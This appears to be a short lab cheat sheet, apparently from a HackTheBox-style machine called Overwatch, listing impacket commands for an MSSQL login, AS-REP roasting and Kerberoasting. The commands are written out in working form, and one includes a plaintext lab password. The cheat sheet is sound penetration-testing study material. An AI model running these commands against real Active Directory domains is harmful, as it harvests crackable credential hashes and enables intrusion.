# impacket

Python suite implementing Windows/AD network protocols (SMB, Kerberos, MSSQL, WMI, DCERPC). Used for interactive MSSQL sessions, AS-REP roasting and Kerberoasting.

## Commands Used

### Interactive MSSQL session with Windows authentication
```bash
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
```
Used on: **Overwatch**

Inside the shell, useful built-ins include:
```
enum_users
enum_owner
```

### AS-REP Roasting
```bash
impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
```
Used on: **Overwatch**

- `-no-pass` — enumerate only accounts with "Do not require Kerberos preauth"
- `-format hashcat` — output in hashcat-compatible format (mode 18200)

### Kerberoasting
```bash
impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
```
Used on: **Overwatch**

- `-request` — request TGS tickets and dump them in crackable format (mode 13100)
